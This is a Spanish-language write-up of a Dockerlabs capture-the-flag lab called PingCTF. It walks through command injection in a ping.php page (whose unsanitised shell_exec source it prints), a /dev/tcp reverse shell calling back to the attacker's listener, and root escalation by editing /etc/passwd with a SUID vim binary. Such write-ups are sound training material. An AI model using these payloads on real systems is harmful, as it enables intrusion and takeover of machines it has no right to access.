
# Writeup Template: Maquina `[ PingCTF ]`

- Tags: #PIngCTF
- Dificultad: `[ Facil ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina PIngCTF](https://mega.nz/file/jVdVyYYK#Cl7k02bD1IHF6_j1tljf497k4l7uPq2QxzJQvs1tqoY) Explotación de una vulnerabilidad que permite la ejecución de comandos en la máquina vulnerable.

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x PingCTF.zip
sudo bash auto_deploy.sh ping_ctf.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p80 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
80/tcp open  http    Apache httpd 2.4.58 ((UbuntuNoble))
```

Buscando exploits para esta version de apache no encontramos nada:
```bash
searchsploit Apache httpd 2.4.58
Exploits: No Results
Shellcodes: No Results
```

---

## Enumeracion de [Servicio Web Principal]
direccion **URL** del servicio:
```bash
http://172.17.0.2/
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2/
http://172.17.0.2/ [200 OK] Apache[2.4.58], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[172.17.0.2], Title[Ping]
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 172.17.0.2 # No reporta nada critico
```
### Descubrimiento de Archivos
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-big.txt -t 20 -x php,php.back,backup,txt,sh,html,js,java,py
```

- **Hallazgos**:
```bash
/index.html           (Status: 200) [Size: 1536]
/javascript           (Status: 301) [Size: 313] [--> http://172.17.0.2/javascript/]
/ping.php             (Status: 302) [Size: 0] [--> index.html]
```
---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Tenemso un archivo **php** que puede darnos pista de como es que se esta gestionando el uso de ping, ahora para probar la seguridad de la aplicacion probaremos escapar comandos
```bash
/ping.php
```

### Ejecucion del Ataque
Si intentamos realizar una petiicion con el comando **ping**, solo nos reporta esto desde la web
```bash
# Resultados para: 172.17.0.1
```

Ahora podemos aprovecharnos de esto para intentar concatenar un comando y ver que logramos derivarlo a un RCE
```bash
# Comandos para explotación
172.17.0.1; whoami
```

La web nos responde:
```bash
# Resultados para: 172.17.0.1; whoami

www-data
```

### Intrusion
Logramos ejecucion remota de comandos, ya que no existe ninguna sanitizacion por parte de la web, Asi que nos aprovechamos de esto para ganar acceso al objetivo
```bash
nc -nlvp 443
```

```bash
# Reverse shell o acceso inicial
172.17.0.1; bash -c 'exec bash -i &>/dev/tcp/172.17.0.1/443 <&1'
```

---

## Escalada de Privilegios
### Enumeracion del Sistema
Una ves ganado acceso al objetivo vemos como es que se estaba gestionando el comando ping con php
```php
<?php

if (isset($_GET['target'])) {
    $target = $_GET['target'];

    echo "<html><head><title>Resultados de Ping</title>";
    echo "<meta charset=\"UTF-8\">"; // Agregamos esta línea para el soporte de acentos
    echo "<style>body { font-family: Arial, sans-serif; background-color: #f0f0f0; padding: 20px;} pre { background-color: #eee; padding: 10px; border-radius: 5px; overflow-x: auto; }</style>";
    echo "</head><body>";
    echo "<h1>Resultados para: " . htmlspecialchars($target) . "</h1>";
    echo "<pre>";

    $command = "ping -c 4 " . $target; // Volvemos a -c 4 para que sea más claro
    
    // Ejecuta el comando y captura su salida
    $output = shell_exec($command);
    
    // Imprime la salida capturada
    echo htmlspecialchars($output); 

    echo "</pre>";
    echo "<p><a href='index.html'>Volver</a></p>";
    echo "</body></html>";
} else {
    header("Location: index.html");
    exit();
}
?>
```
### Explotacion de Privilegios

###### Usuario `[ www-data ]`:
Listando archivos temporales **( /tmp )**
```bash
drwx------  2 root www-data 4096 Jun 28 22:31 vNCeK9N
```

Enumerando privilegios **SUID**
```bash
find / -perm -4000 -ls 2>/dev/null
```

Tenemos el siguiente binario:
```bash
11912179   4036 -rwsr-xr-x   1 root     root      4126400 Apr  1 20:12 /usr/bin/vim.basic
```

Intentando ganar acceso como **root** sabiendo que el binario de **python3** si existe, mediante este bianrio no podemos ganar acceso como **root**
```bash
/usr/bin/vim.basic -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
```

Ahora intentamos modificar el archivo **passwd**, Ya que si logramos modificarlo tendiramos acceso garantizado como **root**
```bash
/usr/bin/vim.basic /etc/passwd
```

Cuando intentamos quitar la **X** de **root** nos indica que este archvio solo es de lectura, pero aun asi forzamos a guardar y salir quedando asi, sin contrasena la cuenta para el usuario **root**
```bash
cat /etc/passwd

root::0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
```

Logramos quitar la **X** del usuario **root** de manera exitosa, Asi que esto nos permite loguearnos como root
```bash
# Comando para escalar al usuario: ( root )
su root
```

---

## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
root@a7635aefa512:/tmp/vNCeK9N# whoami
root
```